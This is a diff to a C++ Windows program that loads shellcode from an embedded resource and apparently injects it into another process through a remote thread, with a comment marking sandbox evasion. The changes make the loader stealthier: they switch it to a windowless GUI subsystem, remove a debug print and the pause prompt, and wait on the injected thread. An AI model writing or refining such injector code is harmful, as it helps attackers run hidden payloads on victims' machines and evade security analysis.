@@ -1,4 +1,4 @@
-// Compile: clang++.exe -O2 -Ob2 -Os -fno-stack-protector -g -Xlinker -pdb:none -Xlinker -subsystem:console -o Caue.exe Caue.cpp metadata.res -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti
+// Compile: clang++.exe -O2 -Ob2 -Os -fno-stack-protector -g -Xlinker -pdb:none -Xlinker -subsystem:windows -o Caue.exe Caue.cpp metadata.res -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti
 
 #include <windows.h>
 #include <stdio.h>
@@ -13,7 +13,7 @@ void shellcode();
 
 using namespace std;
 
-int main(int argc, char* argv[]) 
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
 {
 	// Simple sanbox evasion
 	char path[MAX_PATH];
@@ -43,7 +43,6 @@ void shellcode() {
 	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(SHELLCODE_RESOURCE), RT_RCDATA);
 	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);
 	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
-	printf("[+] Resource size: %lu bytes\n", (unsigned long)shellcodeSize);
 	
 	// Copy the shellcode to a modifiable buffer
 	char* dataCopy = new char[shellcodeSize];
@@ -78,5 +77,5 @@ void shellcode() {
 	CloseHandle(processHandle);
 	delete[] dataCopy;
 
-	system("pause");
+	WaitForSingleObject(remoteThread, INFINITE);
 }
